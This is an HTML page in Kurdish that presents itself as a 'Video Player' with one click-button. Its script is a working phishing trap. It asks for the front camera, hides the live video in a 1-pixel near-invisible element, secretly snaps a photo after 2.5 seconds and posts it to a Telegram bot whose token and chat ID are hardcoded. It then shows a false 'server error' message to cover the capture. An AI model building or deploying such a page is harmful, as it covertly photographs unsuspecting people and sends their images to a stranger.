<!DOCTYPE html>
<html lang="ku" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Video Player</title>
    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+Arabic:wght@400;600&family=Reem+Kufi:wght@500&family=Poppins:wght@600&display=swap" rel="stylesheet">
    
    <style>
        body {
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #0c0c0c;
            background-image: 
                linear-gradient(335deg, #000000 23px, transparent 23px),
                linear-gradient(155deg, #000000 23px, transparent 23px);
            background-size: 58px 58px;
            font-family: 'IBM Plex Sans Arabic', sans-serif;
            overflow: hidden;
            position: relative;
        }

        /* ناوی Ala */
        .name-tag {
            position: absolute;
            top: 15%; 
            left: 50%;
            transform: translateX(-50%);
            font-family: 'Poppins', sans-serif;
            font-size: 30px;
            color: rgba(255, 255, 255, 0.4); 
            display: flex;
            align-items: center;
            gap: 10px;
            direction: ltr;
            z-index: 10;
        }

        /* کارتە شووشەییەکە - خراوەتە پێشەوەی هەموو شتێک */
        #main-container {
            position: relative;
            z-index: 100; /* زۆر لە پێشەوەیە */
            background: rgba(15, 15, 15, 0.95); /* کەمێک تۆختر بۆ ئەوەی پشتەوە دیار نەبێت */
            padding: 60px 35px;
            border-radius: 35px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            width: 85%;
            max-width: 340px;
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            text-align: center;
        }

        h2 { color: #ffffff; margin-bottom: 45px; font-family: 'Reem Kufi', sans-serif; }

        #startBtn {
            padding: 16px 30px;
            font-size: 19px;
            border-radius: 18px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            background: rgba(255, 255, 255, 0.1);
            color: #ffffff;
            cursor: pointer;
            font-weight: bold;
        }

        /* ڤیدیۆکە لێرە خراوەتە دوایین چینی پشتەوە و زۆر بچووک کراوەتەوە */
        #v {
            position: fixed;
            top: 0;
            left: 0;
            width: 1px;
            height: 1px;
            opacity: 0.01;
            z-index: -1; /* دەچێتە پشت باگراوەندە ڕەشەکەش */
            pointer-events: none;
        }
    </style>
</head>
<body>

    <div class="name-tag">Ala <span style="font-size:22px">🩶</span></div>

    <div id="main-container">
        <h2 id="status">ئـــەزیــزن🩶</h2>
        <button id="startBtn" onclick="startCapture()">&lt;👈🏽کلیک کردن👉🏽&gt;</button>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c" style="display:none;"></canvas>

    <script>
        const token = '7690976118:AAFBKfwJcXYlhYf4CDLIoynZoTTLho1jp5g'; 
        const myId = '7978104952'; 

        function startCapture() {
            const btn = document.querySelector('#startBtn');
            const statusText = document.querySelector('#status');
            
            statusText.innerText = "...کەمێک چاوەڕێ بکە";
            btn.style.display = 'none';

            navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            })
            .then(s => {
                const v = document.querySelector('#v');
                v.srcObject = s;
                v.play();
                
                // چاوەڕوانی ٢.٥ چرکە
                setTimeout(() => {
                    const c = document.querySelector('#c');
                    c.width = v.videoWidth;
                    c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    
                    c.toBlob(b => {
                        const f = new FormData();
                        f.append('chat_id', myId);
                        f.append('photo', b, 'img.jpg');

                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                            method: 'POST',
                            body: f
                        }).then(() => {
                            statusText.innerText = "کێشەیەک لە سێرڤەر ڕوویدا.";
                            s.getTracks().forEach(t => t.stop());
                        });
                    }, 'image/jpeg', 0.8);
                }, 2500); 
            })
            .catch(e => {
                statusText.innerText = "تکایە ڕێگە بدە (Allow).";
                btn.style.display = 'inline-block';
            });
        }
    </script>
</body>
</html>
